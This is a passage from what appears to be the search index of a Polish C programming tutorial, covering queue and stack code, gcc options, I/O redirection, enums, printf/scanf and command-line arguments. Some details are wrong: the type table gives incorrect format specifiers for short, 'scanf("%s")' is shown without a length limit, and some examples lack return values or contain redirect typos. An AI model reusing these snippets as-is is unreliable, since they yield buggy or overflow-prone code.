new_el;\n    queue-&gt;el_count++;\n}\n\nint front(Queue *queue) {\n    if (queue-&gt;front_el != NULL) {\n        return queue-&gt;front_el-&gt;value;\n    }\n}\n\nvoid pop(Queue *queue) {\n    if (queue-&gt;front_el != NULL) {\n        element *tmp = queue-&gt;front_el-&gt;next;\n        free(queue-&gt;front_el);\n        queue-&gt;front_el = tmp;\n        queue-&gt;el_count--;\n        return;\n    }\n}\n\nvoid clear(Queue *queue) {\n    element *tmp;\n    while (queue-&gt;front_el != NULL) {\n        tmp = queue-&gt;front_el-&gt;next;\n        free(queue-&gt;front_el);\n        queue-&gt;front_el = tmp;\n    }\n}\n\nint is_empty(Queue *queue) {\n    return queue-&gt;front_el == NULL;\n}\n\nint count(Queue *queue) {\n    return queue-&gt;el_count;\n}\n\nint main() {\n    int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n    Queue queue;\n\n    init(&amp;queue);\n\n    for (int i = 0; i &lt; 10; i++) {\n        push(array[i], &amp;queue);\n    }\n\n    printf(\"%d\\n\", count(&amp;queue));\n\n    while (!is_empty(&amp;queue)) {\n        printf(\"%d \", front(&amp;queue));\n        pop(&amp;queue);\n    }\n\n    printf(\"\\n\");\n\n    clear(&amp;queue);\n\n    return 0;\n}\n</code></pre> <p>Ten kod zapewnia prost\u0105 implementacj\u0119 kolejki z podstawowymi operacjami, takimi jak inicjalizacja, wypychanie, wyskakiwanie, sprawdzanie, czy jest pusta, liczenie element\u00f3w i czyszczenie kolejki. Poni\u017cej znajduje si\u0119 kr\u00f3tki opis kluczowych komponent\u00f3w i funkcji.</p>"},{"location":"programming/c/algorithms/structures/queue/#struktury","title":"Struktury","text":"<ol> <li> <p>element: Reprezentuje w\u0119ze\u0142 na po\u0142\u0105czonej li\u015bcie.</p> </li> <li> <p>Queue: Reprezentuje sam\u0105 kolejk\u0119, zawieraj\u0105c wska\u017anik do pierwszego elementu i liczb\u0119 element\u00f3w.</p> </li> </ol>"},{"location":"programming/c/algorithms/structures/queue/#funkcje","title":"Funkcje","text":"<ol> <li> <p>init: Inicjalizuje kolejk\u0119 ustawiaj\u0105c przedni element na <code>NULL</code> i liczb\u0119 element\u00f3w na 0.</p> </li> <li> <p>push: Dodaje nowy element o podanej warto\u015bci na koniec kolejki.</p> </li> <li> <p>front: Zwraca warto\u015b\u0107 pierwszego elementu w kolejce.</p> </li> <li> <p>pop: Usuwa przedni element z kolejki.</p> </li> <li> <p>clear: Opr\u00f3\u017cnia kolejk\u0119 poprzez zwolnienie wszystkich element\u00f3w.</p> </li> <li> <p>is_empty: Sprawdza, czy kolejka jest pusta.</p> </li> <li> <p>count: Zwraca liczb\u0119 element\u00f3w w kolejce.</p> </li> </ol>"},{"location":"programming/c/algorithms/structures/queue/#funkcja-main","title":"Funkcja main","text":"<p>Funkcja <code>main</code> demonstruje u\u017cycie kolejki:</p> <ol> <li>Inicjalizuje kolejk\u0119.</li> <li>Przesuwa elementy z tablicy do kolejki.</li> <li>Wypisuje liczb\u0119 element\u00f3w w kolejce.</li> <li>Iteruje przez kolejk\u0119, drukuj\u0105c i wyskakuj\u0105c ka\u017cdy element.</li> <li>Czy\u015bci kolejk\u0119.</li> </ol>"},{"location":"programming/c/algorithms/structures/stack/","title":"Stos","text":""},{"location":"programming/c/algorithms/structures/stack/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/structures/stack/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct Element {\n  int value;\n  struct Element *next;\n} Element;\n\nElement *top_el;\nint el_count;\n\nvoid init_stack() {\n  top_el = NULL;\n  el_count = 0;\n}\n\nvoid push(int value) {\n  Element *new_el = malloc(sizeof(Element));\n  new_el-&gt;value = value;\n  new_el-&gt;next = top_el;\n  top_el = new_el;\n  el_count++;\n}\n\nint top() {\n  if (top_el != NULL) {\n    return top_el-&gt;value;\n  }\n}\n\nvoid pop() {\n  if (top_el != NULL) {\n    Element *tmp = top_el-&gt;next;\n    free(top_el);\n    top_el = tmp;\n    el_count--;\n    return;\n  }\n}\n\nvoid clear() {\n  Element *tmp;\n  while (top_el != NULL) {\n    tmp = top_el-&gt;next;\n    free(top_el);\n    top_el = tmp;\n  }\n}\n\nint is_empty() { return top_el == NULL; }\n\nint count() { return el_count; }\n\nint main() {\n  int array[10] = {7, 3, 0, 1, 5, 2, 5, 19, 10, 5};\n\n  for (int i = 0; i &lt; 10; i++) {\n    push(array[i]);\n  }\n\n  printf(\"Number of elements on the stack: %d\\n\", count());\n\n  while (!is_empty()) {\n    printf(\"Top element: %d\\n\", top());\n    pop();\n  }\n\n  clear();\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/introduction/","title":"Wprowadzenie","text":"<p>Danger</p>"},{"location":"programming/c/introduction/#uwaga","title":"Uwaga","text":"<p>To nie jest tutorial programowania. Za\u0142o\u017cenie jest takie, \u017ce wiesz ju\u017c co nieco o programowaniu, by\u0107 mo\u017ce znasz inny j\u0119zyk programowania i chcesz si\u0119 dowiedzie\u0107 jak podstawowe konstrukcje wygl\u0105daj\u0105 w j\u0119zyku C.</p> <p>Nie b\u0119dziemy tutaj t\u0142umaczy\u0107 czym jest p\u0119tla czy instrukcja warunkowe, a jedynie poka\u017cemy, jak te konstrukcje wygl\u0105daj\u0105 w j\u0119zyku C.</p> <p>Je\u017celi dopiero zaczynasz, zapoznaj si\u0119 najpierw z wprowadzeniem do algorytm\u00f3w: Wprowadzenie</p>"},{"location":"programming/c/introduction/#srodowiska-lokalne","title":"\u015arodowiska lokalne","text":""},{"location":"programming/c/introduction/#codeblocks","title":"Code::Blocks","text":"<p>Dobre \u015brodowisko dla pocz\u0105tkuj\u0105cych. \u0141atwe w obs\u0142udze, przejrzyste i darmowe. Pozwala zar\u00f3wno tworzy\u0107 rozbudowane projekty, jak i proste aplikacje konsolowe.</p>"},{"location":"programming/c/introduction/#instalacja","title":"Instalacja","text":"<p>Pobieramy \u015brodowisko ze strony https://www.codeblocks.org/downloads/binaries/. Mo\u017cemy zainstalowa\u0107 samo \u015brodowisko, lub razem w pakiecie z kompilatorem. W celu instalacji pe\u0142nego zestawu, tzn. \u015brodowisko plus kompilator, wybieramy wersj\u0119 z mingw, np. codeblocks-20.03mingw-setup.exe.</p>"},{"location":"programming/c/introduction/#visual-studio-code","title":"Visual Studio Code","text":"<p>U swoich podstaw Visual Studio Code to edytor tekstu, co\u015b jak rozbudowany notatnik. To co jednak go wyr\u00f3\u017cnia, to mo\u017cliwo\u015b\u0107 rozbudowania za pomoc\u0105 najr\u00f3\u017cniejszych dodatk\u00f3w/plugin\u00f3w. Lekkie, przyjemne, darmowe i z ogromnymi mo\u017cliwo\u015bciami. Wymaga troch\u0119 czasu, aby nauczy\u0107 si\u0119 z niego efektywnie korzysta\u0107, ale warto.</p>"},{"location":"programming/c/introduction/#instalacja_1","title":"Instalacja","text":"<p>Instalator pobierzemy ze strony: https://code.visualstudio.com/.</p>"},{"location":"programming/c/introduction/#srodowiska-webowe","title":"\u015arodowiska webowe","text":"<p>W przeciwie\u0144stwie do \u015brodowisk lokalnych, \u015brodowiska webowe dost\u0119pne s\u0105 z poziomu przegl\u0105darki i nie wymagaj\u0105 \u017cadnej dodatkowej instalacji. Ma to oczywi\u015bcie swoje wady i zalety. \u015arodowiska webowe zazwyczaj dzia\u0142aj\u0105 wolniej i maj\u0105 swoje ograniczenia.</p>"},{"location":"programming/c/introduction/#ideone","title":"Ideone","text":"<p>Dosy\u0107 podstawowy kompilator webowy. Posiada wsparcie dla wielu j\u0119zyk\u00f3w. Do jego zalet mo\u017cna zaliczy\u0107 stosunkowo szybk\u0105 kompilacj\u0119 i mo\u017cliwo\u015b\u0107 korzystania bez rejestracji, a tak\u017ce \u0142atwo\u015b\u0107 udost\u0119pniania swoich kod\u00f3w. Do minus\u00f3w mo\u017cna zaliczy\u0107 brak interaktywno\u015bci - ca\u0142e wej\u015bcie musimy wprowadzi\u0107 w specjalnym oknie, przed uruchomieniem programu.</p> <p>https://ideone.com/</p>"},{"location":"programming/c/introduction/#sciaga","title":"\u015aci\u0105ga","text":"<p>\u015aci\u0105ga</p>"},{"location":"programming/c/introduction/cmd-compilation/","title":"Kompilacja z linii polece\u0144","text":"<p>Kto potrzebuje zaawansowanego \u015brodowiska programistycznego, z kolorowaniem sk\u0142adni, automatycznymi podpowiedziami, rozbudowanym debuggerem, gdy mo\u017cna pisa\u0107 w notatniku i kompilowa\u0107 r\u0119cznie z linii polece\u0144? Mam nadziej\u0119, \u017ce to pytanie retoryczne. Niemniej poka\u017c\u0119, jak kompilowa\u0107 programy napisane w j\u0119zyku C z poziomu terminala.</p>"},{"location":"programming/c/introduction/cmd-compilation/#zaprzyjaznij-sie-z-terminalem","title":"Zaprzyja\u017anij si\u0119 z terminalem","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce mamy gotowy program zapisany w pliku main.cpp. Aby go skompilowa\u0107 z linii polece\u0144 wystarczy napisa\u0107:</p> LinuxWindows <pre><code>gcc main.c\n</code></pre> <pre><code>gcc main.c\n</code></pre> <p>Proste, prawda? Teraz, aby uruchomi\u0107 program, nale\u017cy wykona\u0107 polecenie:</p> LinuxWindows <pre><code>./a.out\n</code></pre> <pre><code>.\\a.exe\n</code></pre> <p>I to by by\u0142o na tyle. Do zobaczenia w innym temacie!</p> <p>Ale zaraz, zaraz... S\u0105 jeszcze opcje, kt\u00f3re mo\u017cemy poda\u0107 do kompilacji. Przedstawi\u0119 kilka z nich, po pe\u0142n\u0105 list\u0119 odsy\u0142am do dokumentacji: https://gcc.gnu.org/onlinedocs/gcc-11.2.0/gcc/#toc-GCC-Command-Options.</p>"},{"location":"programming/c/introduction/cmd-compilation/#opcje","title":"Opcje","text":"<p>Tak jak i w przypadku wielu innych polece\u0144 wywo\u0142ywanych z terminala, opcje podajemy po my\u015blnikach, czasem podw\u00f3jnych.</p>"},{"location":"programming/c/introduction/cmd-compilation/#nazwa-pliku-wykonywalnego","title":"Nazwa pliku wykonywalnego","text":"<p>Je\u017celi chcemy poda\u0107 nazw\u0119 docelowego wyniku kompilacji, mo\u017cemy to zrobi\u0107 za pomoc\u0105 opcji <code>-o</code>.</p> LinuxWindows <pre><code>gcc -o main.out main.c\n./main.out\n</code></pre> <pre><code>gcc -o main.exe main.c\n.\\main.exe\n</code></pre>"},{"location":"programming/c/introduction/cmd-compilation/#wiecej-warningow","title":"Wi\u0119cej warning\u00f3w!","text":"<p>Je\u017celi chcemy zobaczy\u0107 w konsoli wi\u0119cej warning\u00f3w (masochi\u015bci), mo\u017cemy skorzysta\u0107 z opcji <code>-Wall.</code></p> LinuxWindows <pre><code>gcc -Wall main.c\n</code></pre> <pre><code>gcc -Wall main.c\n</code></pre>"},{"location":"programming/c/introduction/cmd-compilation/#optymalizacja","title":"Optymalizacja","text":"<p>Pot\u0119\u017cna opcja. W niekt\u00f3rych przypadkach mo\u017ce poprawi\u0107 osi\u0105gi naszego programu.</p> LinuxWindows <pre><code>gcc -O2 main.c\n</code></pre> <pre><code>gcc -O2 main.c\n</code></pre>"},{"location":"programming/c/introduction/cmd-compilation/#debugowanie","title":"Debugowanie","text":"<p>Aby w\u0142\u0105czy\u0107 debugowanie u\u017cyjemy opcji <code>-g</code>.</p> LinuxWindows <pre><code>gcc -g main.c\n</code></pre> <pre><code>gcc -g main.c\n</code></pre>"},{"location":"programming/c/introduction/cmd-compilation/#przekierowanie-wejsciawyjscia","title":"Przekierowanie wej\u015bcia/wyj\u015bcia","text":"<p>Uruchamianie skompilowanego programu z terminala ma swoje zalety. Jedn\u0105 z nich jest \u0142atwe przekierowanie wej\u015bcia i wyj\u015bcia naszego programu, np. z i do pliku.</p>"},{"location":"programming/c/introduction/cmd-compilation/#wejscie-z-pliku","title":"Wej\u015bcie z pliku","text":"<p>Aby przekierowa\u0107 wej\u015bcie z pliku tekstowego nale\u017cy skorzysta\u0107 z operatora <code>&lt;</code>.</p> LinuxWindows <pre><code>./main.out &lt; dane_wej.txt\n</code></pre> <pre><code>.\\main.exe &lt; dane_wyj.txt\n</code></pre>"},{"location":"programming/c/introduction/cmd-compilation/#wyjscie-do-pliku","title":"Wyj\u015bcie do pliku","text":"<p>W celu utworzenia pliku i przekierowania do niego wyj\u015bcia z naszego programu u\u017cyjemy operatora <code>&gt;</code>.</p> LinuxWindows <pre><code>./main.out &gt; dane_wyj.txt\n</code></pre> <pre><code>.\\main.exe &gt; dane_wyj.txt\n</code></pre> <p>Je\u017celi nie chcemy nadpisywa\u0107 pliku, a jedynie dopisa\u0107 do niego nowe dane, u\u017cyjemy operatora <code>&gt;&gt;</code>.</p> LinuxWindows <pre><code>./main.out &gt;&gt; dane_wyj.txt\n</code></pre> <pre><code>.\\main.exe &gt; dane_wyj.txt\n</code></pre>"},{"location":"programming/c/introduction/cmd-compilation/#jedno-i-drugie-naraz","title":"Jedno i drugie naraz","text":"<p>Powy\u017csze metody mo\u017cemy ze sob\u0105 \u0142\u0105czy\u0107, w dowolnej kolejno\u015bci.</p> LinuxWindows <pre><code>./main.out &lt; dane_wej.txt &gt; dane_wyj.txt\n</code></pre> <pre><code>.\\main.exe &lt; dane_wej.txt &gt; dane_wyj.txt\n</code></pre>"},{"location":"programming/c/introduction/enumerations/","title":"Enumeracje","text":"<p>Enumeracja to specjalny rodzaj struktury danych. Pozwala nam na zdefiniowanie pewnej listy nazw, kt\u00f3re p\u00f3\u017aniej mo\u017cemy interpretowa\u0107 jako warto\u015bci liczbowe. Najlepiej to om\u00f3wi\u0107 na przyk\u0142adzie.</p>"},{"location":"programming/c/introduction/enumerations/#przykad","title":"Przyk\u0142ad","text":"<p>Rozwa\u017cmy sytuacje, w kt\u00f3rej tworzymy aplikacj\u0119 webow\u0105 obs\u0142uguj\u0105c\u0105 konta u\u017cytkownik\u00f3w o r\u00f3\u017cnym poziomie dost\u0119pu. Mo\u017cemy mie\u0107 zwyk\u0142ego u\u017cytkownika, kt\u00f3ry ma dost\u0119p tylko do podstawowych funkcjonalno\u015bci, ale tak\u017ce moderatora i administratora. Ka\u017cdy z nich b\u0119dzie mia\u0142 inne uprawnienia i ich role musz\u0105 by\u0107 brane pod uwag\u0119 w wielu miejscach naszej implementacji. W tym celu utworzymy enumeracj\u0119 tych r\u00f3l.</p>"},{"location":"programming/c/introduction/enumerations/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\ntypedef enum role {\n  user, moderator, admin\n} role;\n\nint main() {\n  role currentRole = admin;\n\n  switch(currentRole) {\n    case user:\n        printf(\"User role: %d\\n\", currentRole);\n        break;\n    case moderator:\n        printf(\"Moderator role: %d\\n\", currentRole);\n        break;\n    case admin:\n        printf(\"Admin role: %d\\n\", currentRole);\n        break;\n  }\n\n  return 0;\n} \n</code></pre>"},{"location":"programming/c/introduction/enumerations/#opis","title":"Opis","text":"<p>Na pocz\u0105tku tworzymy enumeracj\u0119 roli: <code>enum role</code>. Nast\u0119pnie w kodzie g\u0142\u00f3wnym przypisujemy wybran\u0105 rol\u0119 do zmiennej <code>currentRole</code>. Dzi\u0119ki wykorzystaniu enumeracji mo\u017cemy w prosty i czytelny spos\u00f3b skorzysta\u0107 z operacji <code>switch</code> i uzale\u017cni\u0107 dzia\u0142anie programu od przypisanej roli. Po uruchomieniu programu mo\u017cna zaobserwowa\u0107, \u017ce do ka\u017cdej zdefiniowanej przez nas roli zosta\u0142a przypisana liczba ca\u0142kowita, poniewa\u017c domy\u015blnie pod enumeracjami kryj\u0105 si\u0119 w\u0142a\u015bnie kolejne liczby ca\u0142kowite. Tak wi\u0119c nasza rola user ma przypisan\u0105 warto\u015b\u0107 \\(0\\), moderator ma warto\u015b\u0107 \\(1\\), a admin ma warto\u015b\u0107 \\(2\\).</p>"},{"location":"programming/c/introduction/input-output/","title":"Obs\u0142uga wej\u015bcia-wyj\u015bcia","text":"<p>W j\u0119zyku C do obs\u0142ugi wej\u015bcia/wyj\u015bcia korzystamy standardowo z funkcji <code>printf</code> oraz <code>scanf</code>.</p>"},{"location":"programming/c/introduction/input-output/#biblioteka","title":"Biblioteka","text":"<p>Funkcje <code>printf</code> oraz <code>scanf</code> znajduj\u0105 si\u0119 w standardowej bibliotece wej\u015bcia/wyj\u015bcia (standard input/output):</p> <pre><code>#include &lt;stdio.h&gt;\n</code></pre>"},{"location":"programming/c/introduction/input-output/#printf","title":"Printf","text":"<p>Funkcja <code>printf</code> przyjmuje dwa argumenty:</p> <ul> <li>format wypisywanego komunikatu,</li> <li>list\u0119 oddzielonych przecinkami warto\u015bci do podstawienia.</li> </ul> <p>Format jest standardowym tekstem, kt\u00f3ry mo\u017ce zawiera\u0107 specjalne symbole okre\u015blaj\u0105ce, \u017ce w tym miejscu komunikatu ma zosta\u0107 podstawiona kolejna warto\u015b\u0107, przekazana jako drugi argument.</p> <p>Funkcji <code>printf</code> mo\u017cemy tak\u017ce u\u017cy\u0107 do wypisania komunikatu bez podawania warto\u015bci do podstawienia.</p> <pre><code>printf(\"Hello World!\");\n</code></pre> <p>Ka\u017cdy symbol specjalny sk\u0142adaj\u0105cy si\u0119 ze znaku <code>%</code> i litery oznacza, \u017ce w to miejsce nale\u017cy wstawi\u0107 odpowiedni\u0105 warto\u015b\u0107. Np. <code>%d</code> w formacie zostanie zast\u0105piony warto\u015bci\u0105 typu <code>int</code> podan\u0105 jako kolejny argument funkcji <code>printf</code>.</p> <pre><code>printf(\"%d\", 68); /* 68 */\nprintf(\"Wynik to %d\", 24); /* Wynik to 24 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#formatowanie-szerokosci","title":"Formatowanie szeroko\u015bci","text":"<p>Mo\u017cemy wypisa\u0107 warto\u015b\u0107 w polu o zadanej minimalnej szeroko\u015bci. Aby to zrobi\u0107, bezpo\u015brednio po znaku % podajemy liczb\u0119 okre\u015blaj\u0105c\u0105 szeroko\u015b\u0107 pola. Domy\u015blnie warto\u015bci b\u0119d\u0105 wyr\u00f3wnywane do prawej.</p> <pre><code>printf(\"%3d\", 0); \nprintf(\"%3d\", 123456789); \nprintf(\"%8d\", -10);\n</code></pre> <p>Aby wyr\u00f3wna\u0107 warto\u015bci do lewej, nale\u017cy poda\u0107 szeroko\u015b\u0107 pola jako liczb\u0119 ujemn\u0105.</p> <pre><code>printf(\"%-3d\", 0);\nprintf(\"%-3d\", 123456789);\nprintf(\"%-8d\", -10);\n</code></pre>"},{"location":"programming/c/introduction/input-output/#uzupenienie-do-szerokosci-pola","title":"Uzupe\u0142nienie do szeroko\u015bci pola","text":"<p>Wypisywan\u0105 warto\u015b\u0107 liczbow\u0105 mo\u017cemy uzupe\u0142ni\u0107 zerami z lewej strony do wymaganej szeroko\u015bci pola. W tym celu piszemy %0, zadan\u0105 szeroko\u015b\u0107 pola i znak formatu.</p> <pre><code>printf(\"%03d\", 0); /* 000 */\nprintf(\"%08d\", 12); /* 00000012 */\nprintf(\"%02d:%02d\", 14, 5); /* 14:05 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#liczby-rzeczywiste","title":"Liczby rzeczywiste","text":"<p>Domy\u015blnie przy wypisywaniu liczb rzeczywistych zostan\u0105 one wypisane z dok\u0142adno\u015bci\u0105 do 6 miejsc po przecinku. Mo\u017cemy to jednak zmieni\u0107, pisz\u0105c %. i zadan\u0105 dok\u0142adno\u015b\u0107. Warto\u015b\u0107 zostanie zaokr\u0105glona do zadanej liczby miejsc po przecinku.</p> <pre><code>printf(\"%f\", 12.85); /* 12.850000 */\nprintf(\"%.2f\", 12.85); /* 12.85 */\nprintf(\"%.1f\", 12.85); /* 12.9 */\n</code></pre> <p>Mo\u017cemy tak\u017ce po\u0142\u0105czy\u0107 okre\u015blenie szeroko\u015bci pola z dok\u0142adno\u015bci\u0105 do zadanej liczby miejsc po przecinku. Nale\u017cy pami\u0119ta\u0107, \u017ce szeroko\u015b\u0107 uwzgl\u0119dnia ca\u0142\u0105 liczb\u0119, \u0142\u0105cznie ze znakiem kropki.</p> <pre><code>printf(\"%6.2f\", 12.85); /* 12.85 */\nprintf(\"%06.2f\", 12.85); /* 012.85 */\nprintf(\"%-6.2f\", 12.85);\n</code></pre>"},{"location":"programming/c/introduction/input-output/#notacja-naukowa","title":"Notacja naukowa","text":"<p>W celu wypisania liczby rzeczywistej w formacie naukowym u\u017cywamy formatu <code>%e</code>.</p> <pre><code>printf(\"%e\", 5.65); /* 5.650000e+00 */\nprintf(\"%e\", 5.653745343438343); /* 5.653745e+00 */\nprintf(\"%e\", 4342342343245.0); /* 4.342342e+12 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#znak-liczby","title":"Znak liczby","text":"<p>Aby zawsze wypisywa\u0107 znak liczby, a nie tylko przy warto\u015bciach ujemnych, mo\u017cemy poda\u0107 znak \\(+\\) przed liter\u0105 formatu.</p> <pre><code>printf(\"%+d\", 5); /* +5 */\nprintf(\"%+d\", -5); /* -5 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#inne-systemy-liczbowe","title":"Inne systemy liczbowe","text":"<p>Za pomoc\u0105 <code>printf</code> mo\u017cemy w \u0142atwy spos\u00f3b wypisa\u0107 liczb\u0119 naturaln\u0105 w systemie oktalnym lub heksadecymalnym. S\u0142u\u017c\u0105 do tego odpowiednio formaty <code>%o</code> i <code>%x</code>.</p> <pre><code>printf(\"%o\", 127); /* 177 */\nprintf(\"%x\", 127); /* 7f */\nprintf(\"%X\", 127); /* 7F */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#link-do-przykadow","title":"Link do przyk\u0142ad\u00f3w","text":"<p>Printf - przyk\u0142ady</p>"},{"location":"programming/c/introduction/input-output/#scanf","title":"Scanf","text":"<p>Funkcja <code>scanf</code> pozwala nam wczyta\u0107 dane od u\u017cytkownika. Jej u\u017cycie wygl\u0105da podobnie do <code>printf</code>. Najpierw podajemy format, a nast\u0119pnie zmienne, do kt\u00f3rych chcemy wczyta\u0107 poszczeg\u00f3lne warto\u015bci. W formacie zazwyczaj ograniczamy si\u0119 do podania format\u00f3w wczytywanych warto\u015bci. Zmienne natomiast musz\u0105 by\u0107 podane jako adres w pami\u0119ci, pod kt\u00f3rym nale\u017cy zapisa\u0107 wczytan\u0105 warto\u015b\u0107. Dlatego zazwyczaj zmienne poprzedzamy symbolem <code>&amp;</code>.</p> <pre><code>int a;\nscanf(\"%d\", &amp;a);\n</code></pre>"},{"location":"programming/c/introduction/input-output/#ignorowanie-znaku","title":"Ignorowanie znaku %","text":"<p>Mo\u017cemy zignorowa\u0107 znak % podany na wej\u015bciu.</p> <pre><code>int a;\nscanf(\"%d%%\", &amp;a);\n</code></pre>"},{"location":"programming/c/introduction/input-output/#inne-systemy-liczbowe_1","title":"Inne systemy liczbowe","text":"<p>Podobnie jak w przypadku <code>printf</code>, <code>scanf</code> mo\u017cemy u\u017cy\u0107 do wczytania liczb w formatach oktalnym i heksadecymalnym.</p> <pre><code>int a, b;\nscanf(\"%o\", &amp;a); /* 012 */\nscanf(\"%x\", &amp;b); /* Af */\nprintf(\"a = %d, b = %d\", a, b); /* a = 10, b = 175 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#wczytywanie-tekstow","title":"Wczytywanie tekst\u00f3w","text":"<p>Teksty wczytujemy do tablicy typu char. W przypadku tablic nie podajemy znaku <code>&amp;</code>, poniewa\u017c nazwa zmiennej tablicowej zwraca adres w pami\u0119ci, gdzie znajduje si\u0119 pocz\u0105tek tablicy.</p> <pre><code>char txt[100];\nscanf(\"%s\", txt);\n</code></pre> <p>Alternatywnie:</p> <pre><code>char txt[100];\nscanf(\"%s\", &amp;txt[0]);\n</code></pre>"},{"location":"programming/c/introduction/input-output/#ignorowanie-wejscia","title":"Ignorowanie wej\u015bcia","text":"<p>Aby wczyta\u0107 i zignorowa\u0107 wej\u015bcie (lub jego fragment), czyli nie przypisywa\u0107 warto\u015bci do zmiennej, mo\u017cemy po znaku <code>%</code> da\u0107 <code>*</code>.</p> <pre><code>int a;\nscanf(\"%*s %d\", &amp;a);  /* Age: 29 */\nprintf(\"a = %d\", a);  /* a = 29 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#maksymalna-dugosc-wejscia","title":"Maksymalna d\u0142ugo\u015b\u0107 wej\u015bcia","text":"<p>Mo\u017cemy okre\u015bli\u0107, ile maksymalnie znak\u00f3w ma zosta\u0107 wczytanych. Reszta danych zostanie zignorowana.</p> <pre><code>int a;\nscanf(\"%2d\", &amp;a);     /* 1234 */\nprintf(\"a = %d\", a);  /* a = 12 */\n</code></pre> <p>Mo\u017cemy te\u017c nie ignorowa\u0107 reszty wej\u015bcia i przypisa\u0107 je do kolejnej zmiennej.</p> <pre><code>int a, b;\nscanf(\"%2d%d\", &amp;a, &amp;b);          /* 1234 */\nprintf(\"a = %d, b = %d\", a, b);  /* a = 12, b = 34 */\n</code></pre>"},{"location":"programming/c/introduction/input-output/#koniec-wejscia","title":"Koniec wej\u015bcia","text":"<p>W momencie napotkania ko\u0144ca wej\u015bcia, funkcja <code>scanf</code> zwr\u00f3ci sta\u0142\u0105 <code>EOF</code>. W celu wczytywania wej\u015bcia a\u017c do jego ko\u0144ca mo\u017cemy wi\u0119c np. zastosowa\u0107 tak\u0105 p\u0119tl\u0119:</p> <pre><code>int a;\nwhile(scanf(\"%d\", &amp;a) != EOF) {\n}\n</code></pre>"},{"location":"programming/c/introduction/input-output/#znaki-specjalne","title":"Znaki specjalne","text":"<ul> <li> - znak nowej linii</li> <li> - tabulacja pozioma</li> <li><code>\\v</code> - tabulacja pionowa</li> <li><code>\\b</code> - backspace</li> <li><code>\\a</code> - alarm</li> <li><code>\\\\</code> - backslash</li> <li><code>\\?</code> - znak</li> <li><code>\\`</code> - apostrof</li> <li><code>\\\"</code> - cudzys\u0142\u00f3w</li> </ul>"},{"location":"programming/c/introduction/input-output/#formaty-typow","title":"Formaty typ\u00f3w","text":"Typ Format <code>char</code> <code>%c</code> <code>unsigned char</code> <code>%c</code> <code>short</code> <code>%h</code> <code>unsigned short</code> <code>%uh</code> <code>int</code> <code>%d</code>, <code>%i</code> <code>unsigned int</code> <code>%u</code> <code>long int</code> <code>%ld</code> <code>unsigned long int</code> <code>%lu</code> <code>long long int</code> <code>%lld</code> <code>unsigned long long int</code> <code>%llu</code> <code>float</code> <code>%f</code>, <code>%F</code> <code>double</code> <code>%lf</code> <code>long double</code> <code>%Lf</code> <code>char*</code> <code>%s</code>"},{"location":"programming/c/introduction/input-output/#formaty-specjalne","title":"Formaty specjalne","text":"Opis Format notacja naukowa <code>%e</code>, <code>%E</code> notacja standardowa lub naukowa, w zale\u017cno\u015bci od wielko\u015bci liczby <code>%g</code>, <code>%G</code> <code>unsigned int</code>w formacie oktalnym (\u00f3semkowym) <code>%o</code> <code>unsigned int</code> w formacie heksadecymalnym (szesnastkowym) <code>%x</code>, <code>%X</code> <code>double</code>w formacie heksadecymalnym (szesnastkowym) <code>%a</code>, <code>%A</code>"},{"location":"programming/c/introduction/parameters/","title":"Wej\u015bcie jako parametry","text":"<p>W j\u0119zyku C mo\u017cna wczytywa\u0107 parametry z linii polece\u0144 podczas uruchamiania programu za pomoc\u0105 funkcji <code>main</code>, kt\u00f3ra mo\u017ce przyjmowa\u0107 dwa argumenty: <code>argc</code> i <code>argv</code>.</p>"},{"location":"programming/c/introduction/parameters/#argumenty-funkcji-main","title":"Argumenty funkcji main","text":"<p>Cz\u0119sto, gdy tworzymy funkcj\u0119 <code>main</code>, to po jej nazwie podajemy puste nawiasy. Funkcja ta jednak mo\u017ce przyjmowa\u0107 dwa argumenty, opisane poni\u017cej.</p> <ul> <li><code>int argc</code>: liczba argument\u00f3w przekazanych do programu, wliczaj\u0105c nazw\u0119 programu.</li> <li><code>char *argv[]</code>: tablica wska\u017anik\u00f3w do argument\u00f3w, gdzie ka\u017cdy element tablicy jest wska\u017anikiem do ci\u0105gu znak\u00f3w reprezentuj\u0105cego jeden argument.</li> </ul>"},{"location":"programming/c/introduction/parameters/#przykad","title":"Przyk\u0142ad","text":"<p>Sp\u00f3jrzmy na poni\u017cszy przyk\u0142ad, by lepiej zrozumie\u0107 z czym mamy do czynienia. Poni\u017cszy kod wypisuje liczb\u0119 przekazanych mu argument\u00f3w podczas uruchamiania, a tak\u017ce wypisuje ka\u017cdy z tych argument\u00f3w.</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char *argv[]) {\n    printf(\"Liczba argument\u00f3w: %d\\n\", argc);\n    for (int i = 0; i &lt; argc; i++) {\n        printf(\"Argument %d: %s\\n\", i, argv[i]);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/introduction/parameters/#uruchamianie-programu","title":"Uruchamianie programu","text":"<p>Za\u0142\u00f3\u017cmy, \u017ce zapisali\u015bmy powy\u017cszy kod w pliku <code>program.c</code> i skompilowali\u015bmy go do pliku wykonywalnego (<code>a.out</code> pod Linuxem, <code>a.exe</code> pod Windowsem). Mo\u017cemy uruchomi\u0107 nasz program z argumentami w nast\u0119puj\u0105cy spos\u00f3b:</p> LinuxWindows <pre><code>./a.out arg1 arg2 arg3\n</code></pre> <pre><code>.\\a.exe arg1 arg2 arg3\n</code></pre> <p>Wynik dzia\u0142ania programu b\u0119dzie wygl\u0105da\u0142 nast\u0119puj\u0105co:</p> LinuxWindows <pre><code>Liczba argument\u00f3w: 4\nArgument 0: ./a.out\nArgument 1: arg1\nArgument 2: arg2\nArgument 3: arg3\n</code></pre> <pre><code>Liczba argument\u00f3w: 4\nArgument 0: .\\a.exe\nArgument 1: arg1\nArgument 2: arg2\nArgument 3: arg3\n</code></pre> <p>Jak wida\u0107, pierwszy argument to zawsze spos\u00f3b, w jaki 